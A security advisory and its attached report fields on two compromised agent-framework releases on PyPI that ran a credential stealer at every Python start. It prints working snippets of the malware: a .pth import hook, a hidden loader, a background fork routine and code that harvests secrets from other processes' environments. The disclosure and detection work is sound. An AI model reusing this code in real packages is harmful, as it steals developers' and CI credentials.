title: Microsoft's agent-framework on PyPI shipped a credential stealer in two releases
content:
TL;DR:
agent-framework 1.26.1 and 1.26.2, two malicious releases of Microsoft Agent Framework's PyPI meta-package published 33 minutes apart on Nov 17, 2026, run a credential stealer on every Python start that targets Azure, Azure DevOps, and GitHub Actions secrets. Both have been removed from PyPI. Pin agent-framework==1.26.0 and rotate every secret on any machine that installed either version.
Who is affected
You're affected if you installed agent-framework 1.26.1 or 1.26.2 between 20:35 UTC and roughly 21:20 UTC on Nov 17, 2026, whether directly or through a loose requirement like agent-framework>=1.26. The package sees about 190,000 downloads a month, so even a 45-minute window adds up.
CI is where this hurts most. A pipeline or container build that resolved a fresh install during that window ran the stealer with whatever the job had access to. On Azure DevOps that means SYSTEM_ACCESSTOKEN and the pipeline's service connections. On GitHub Actions, 1.26.2 goes after the OIDC token any workflow with id-token: write can request. Developer laptops and Azure VMs with a managed identity attached are exposed too.
Detecting it with Aikido Security
If you are an Aikido user, check your central feed and filter on malware issues. This will surface as a 100/100 critical issue. Aikido rescans nightly, but we recommend triggering a manual rescan now.
If you are not yet an Aikido user, you can create an account and connect your repos. Our malware coverage is included in the free plan, no credit card required.
For future protection, consider Aikido Safe Chain (open source). Safe Chain sits in your existing workflow, intercepting npm, npx, yarn, pnpm, and pnpx commands and checking packages against Aikido Intel before install.
For broader coverage across your whole team, Aikido's Device Protection gives you visibility and control over the software packages installed on your team's devices. It covers browser extensions, code libraries, IDE plugins, and build dependencies, all in one place. Stop malware before it gets installed.
How to fix it
- Check with pip show agent-framework, and look for agent_framework_meta.pth or af_runtime_diag.pth in your site-packages directories, including CI caches and container images built since Nov 17.
- Pin agent-framework==1.26.0 and rebuild affected environments.
- Treat every secret the machine could reach as stolen. That includes Azure DevOps personal access tokens and service connections, Azure service principal credentials, GitHub, npm, PyPI, and Hugging Face tokens, Docker registry credentials, and anything in .env files.
- Review Entra ID sign-in logs for the service principals and federated credentials used by your pipelines and workflows.
- Search your proxy and DNS logs for connections to webhook[.]site.
Removing the package stops future runs, but it doesn't undo anything that was already sent.
Overview
On Nov 17, 2026, Microsoft's agent-framework package on PyPI was compromised. At 20:35 UTC, version 1.26.1 appeared with a credential stealer that runs every time Python starts, whether or not anything imports the package, and sends cloud and CI secrets to a webhook.site URL. agent-framework is the meta-package for Microsoft Agent Framework, Microsoft's Python SDK for building AI agents, so the machines most likely to install it are the ones holding Azure credentials worth stealing.
We pulled the wheel apart while it was still live. Then the attacker shipped again. Thirty-three minutes after the first upload, 1.26.2 was on PyPI and 1.26.1 was gone, replaced by the same stealer under a new filename with a fresh target in GitHub Actions. By 21:20 UTC both versions had been removed and 1.26.0 was the latest release again.
1.26.1 looks like a routine patch release
The attacker kept the first change small. 1.26.1 has the same README and the same agent-framework-core[all]==1.26.0 pin as 1.26.0, which shipped five days earlier, so a dependency bot PR bumping it would look like routine noise. Diffing the two wheels turns up two new files and one edited one.
- agent_framework_meta.pth: not present in 1.26.0, added in 1.26.1
- agent_framework_meta/_telemetry.py: not present in 1.26.0, added in 1.26.1
- agent_framework_meta/__init__.py: 853 bytes in 1.26.0, 994 bytes in 1.26.1 with the loader added
The packaging gives the game away too. Microsoft's release pipeline publishes this package as a wheel plus a source distribution (sdist), and the two 1.26.0 files went up 40 seconds apart. 1.26.1 has only a wheel. Inside it, the WHEEL file keeps the old placeholder timestamp from the original build, while METADATA, RECORD, and the edited and added files are all stamped Nov 17. The two injected files are also world-writable (rw-rw-rw-), unlike everything else in the package. That fits someone who unpacked a legitimate wheel, edited it by hand, and uploaded the repacked file with valid publishing credentials. How they got those credentials isn't known yet.
How the stealer gets to run
The .pth hook
When Python starts, its site module reads every .pth file in site-packages. These files exist to add directories to the import path, but any line that begins with import gets executed. Wheels never run code at install time, so for a wheel a .pth file is the closest thing to an npm postinstall hook, and in one way it's worse. It fires on every interpreter launch in that environment, which means your code never has to import agent_framework at all. Running pytest or pip itself is enough.
The file in 1.26.1 is a single line:
import agent_framework_meta
That import resolves to agent_framework_meta/__init__.py, where the attacker appended a loader below the legitimate version lookup and wrapped it so it can never raise:
# Lightweight runtime diagnostics hook.
try:
    from . import _telemetry as _telemetry
    _telemetry._start()
except Exception:
    pass
Forking into the background
_start() makes sure the payload runs once per process tree and never slows down the Python process that triggered it:
def _start():
    if os.environ.get("_AF_TEL"):
        return
    os.environ["_AF_TEL"] = "1"
    try:
        if hasattr(os, "fork"):
            pid = os.fork()
            if pid == 0:
                try:
                    os.setsid()
                except Exception:
                    pass
                _run()
                os._exit(0)
            return
    except Exception:
        pass
    try:
        import threading
        t = threading.Thread(target=_run)
        t.daemon = True
        t.start()
    except Exception:
        pass
Child processes inherit the _AF_TEL environment variable, which stops every subprocess Python spawns from firing the stealer again. On Linux and macOS it forks and calls setsid(), so the child detaches into its own session and keeps working after your command returns. On Windows, where there's no fork, it falls back to a daemon thread.
What the stealer collects
Environment variables, including other processes'
The stealer copies any environment variable whose name contains one of a long list of substrings, among them TOKEN, SECRET, KEY, AZURE, AWS, GITHUB, HF_, OPENAI, FOUNDRY, SYSTEM, BUILD, PIP, NPM, and NUGET. Then it reads /proc/<pid>/environ for up to 300 running processes:
for e in glob.glob("/proc/[0-9]*/environ")[:300]:
    try:
        raw = open(e, "rb").read().decode("utf-8", "replace")
        hits = []
        for kv in raw.split("\x00"):
            if any(x in kv.upper() for x in ("TOKEN","SECRET","PASSWORD","KEY=","ENDPOINT_AUTH","SYSTEM_ACCESSTOKEN","IDENTITY_HEADER")):
                hits.append(kv[:2000])
On a CI runner, that reaches secrets held by the build agent process itself, beyond whatever was handed to the Python step.
Credential files on disk
It globs a list of well-known credential locations and reads up to 60 matching files under 256 KB each, including:
- Azure CLI state in ~/.azure/*.json
- pip.conf, .npmrc, .netrc, and .git-credentials
- Docker's config.json
- Hugging Face t

report.summary: Two malicious agent-framework releases on PyPI carried a credential stealer that ran on every Python start, harvesting Azure, Azure DevOps and GitHub Actions secrets.
report.background: Microsoft Agent Framework's PyPI meta-package agent-framework pulls in the company's Python SDK for building AI agents, so the machines that install it typically hold Azure credentials worth stealing. On Nov 17, 2026, two tampered wheels appeared 33 minutes apart before being pulled roughly 45 minutes after the first upload. The attacker appears to have unpacked a legitimate wheel, hand-edited it, and republished it with valid credentials — the classic signature of a compromised maintainer or release-pipeline token rather than a typosquat. It follows a broader pattern of supply-chain attacks moving from npm postinstall scripts into the Python ecosystem, where package installs are often treated as inherently safe. With roughly 190,000 monthly downloads and heavy CI usage, even a narrow exposure window can leak a lot of cloud secrets.
key_points: The payload rode a .pth file, not a normal import. Python's site module executes any line in site-packages .pth files that begins with 'import', so the stealer fired on every interpreter launch — running pytest or pip was enough. No code ever had to import agent_framework, and wheel installs have no equivalent install-time hook for defenders to inspect.

Forensics point to a stolen publishing credential, not a typo. 1.26.1 shipped as a wheel only with no sdist, kept a stale placeholder timestamp in its WHEEL file, and added two world-writable files unlike the rest of the package — consistent with someone unpacking a real wheel, editing it, and re-uploading with valid credentials.

The stealer detaches and stays quiet. It sets an environment flag so it runs once per process tree, then forks and calls setsid() on Linux and macOS so the child survives after your command returns, falling back to a daemon thread on Windows. The code is wrapped in bare try/except blocks so it never raises or slows the host process.

It hunts beyond its own environment. Besides copying variables matching TOKEN, SECRET, KEY, AZURE, GITHUB and similar patterns, it reads /proc/<pid>/environ for up to 300 processes and globs known credential files — Azure CLI state, pip.conf, .npmrc, .netrc, .git-credentials and Docker config — sending everything to a webhook.site URL.

CI is the highest-value target. On Azure DevOps the stealer reaches SYSTEM_ACCESSTOKEN and service connections held by the build agent; on GitHub Actions, 1.26.2 specifically added a grab for the OIDC token available to workflows with id-token: write. Laptops and Azure VMs with managed identities were also exposed.
report.impact: For the AI industry, this is a reminder that agent frameworks sit in the most credential-dense corner of the stack: they hold model provider keys, cloud identities and CI tokens all at once. A 45-minute window on a package with ~190k monthly downloads is enough to poison container builds and pipeline caches that persist long after the version is yanked. For developers, the practical lesson is that lockfiles and hash pinning in CI are the real defence — a loose agent-framework>=1.26 range resolved straight into the malicious build. For end users, the risk is downstream and delayed: leaked CI tokens can be used to push further tampered releases or reach production data weeks later. Removing the package stops future theft but does not undo exfiltration, so secret rotation is mandatory, not optional.
report.tools: To follow up: Aikido Safe Chain (open source) intercepts npm/pnpm/yarn installs and checks packages against threat intel before they land; pip-audit and uv's hash-pinned lockfiles help detect and prevent tampered resolutions. Socket and Phylum offer similar package-reputation scanning for Python. For provenance, watch Sigstore/PyPI Trusted Publishing attestations and PEP 740 metadata as a way to verify who actually built a wheel. Practically, add CI checks for stray .pth files in site-packages and pin exact versions with hashes.
